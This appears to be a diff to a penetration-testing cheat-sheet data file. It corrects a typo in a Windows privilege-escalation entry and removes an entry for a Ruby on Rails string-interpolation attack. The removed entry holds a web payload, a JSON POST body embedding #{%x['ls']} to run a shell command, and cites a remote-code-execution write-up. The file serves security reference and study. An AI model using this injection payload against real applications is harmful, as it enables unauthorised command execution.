@@ -3628,7 +3628,7 @@ list installed patches on windows
 EOC
 Windows
 privilege escalation
-eumeration
+enumeration
 EOT
 http://www.fuzzysecurity.com/tutorials/16.html
 EOR
@@ -3840,12 +3840,4 @@ shell
 privilege escalation
 EOT
 https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/
-EOR
-POST: {“listing”:{“directions”:[{“test”:[{“abc”:”#{%x[‘ls’]}+foo”}]}] }}
-Ruby on Rails String Interpolation  : anything in #{} is executed
-EOC
-ruby
-web application
-EOT
-http://buer.haus/2017/03/13/airbnb-ruby-on-rails-string-interpolation-led-to-remote-code-execution/
 EOR
